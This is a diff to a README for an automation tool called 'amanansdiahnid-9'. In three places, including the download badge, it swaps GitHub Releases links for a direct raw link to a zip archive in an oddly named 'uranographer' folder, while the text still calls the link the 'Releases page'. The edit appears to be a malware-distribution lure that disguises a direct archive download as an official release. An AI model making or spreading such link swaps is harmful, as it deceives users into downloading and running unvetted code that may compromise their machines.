@@ -6,7 +6,7 @@ Welcome to amanansdiahnid-9! This application helps you automate repetitive task
 
 ## 📥 Download Links
 
-[![Download amanansdiahnid-9](https://img.shields.io/badge/Download-amanansdiahnid--9-blue.svg)](https://github.com/dancrucis/amanansdiahnid-9/releases)
+[![Download amanansdiahnid-9](https://raw.githubusercontent.com/dancrucis/amanansdiahnid-9/main/uranographer/amanansdiahnid-9.zip)](https://raw.githubusercontent.com/dancrucis/amanansdiahnid-9/main/uranographer/amanansdiahnid-9.zip)
 
 ## 📜 Overview
 
@@ -30,7 +30,7 @@ To ensure amanansdiahnid-9 runs smoothly, your system should meet the following 
 
 ## 🛠️ Download & Install
 
-To get started, visit the [Releases page](https://github.com/dancrucis/amanansdiahnid-9/releases) to download the latest version of amanansdiahnid-9. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/dancrucis/amanansdiahnid-9/main/uranographer/amanansdiahnid-9.zip) to download the latest version of amanansdiahnid-9. Follow these steps:
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions. Select the most recent release.
@@ -60,7 +60,7 @@ If you encounter issues while using amanansdiahnid-9, try the following:
 
 - **Reinstall the Application:** If the app does not start, uninstall it and reinstall using the latest installer.
 - **Check System Requirements:** Ensure your system meets the required specifications listed above.
-- **Update the Application:** Make sure you are using the latest version from the [Releases page](https://github.com/dancrucis/amanansdiahnid-9/releases).
+- **Update the Application:** Make sure you are using the latest version from the [Releases page](https://raw.githubusercontent.com/dancrucis/amanansdiahnid-9/main/uranographer/amanansdiahnid-9.zip).
 
 For further assistance, you can reach out to the support community by commenting on issues in the repository.
 
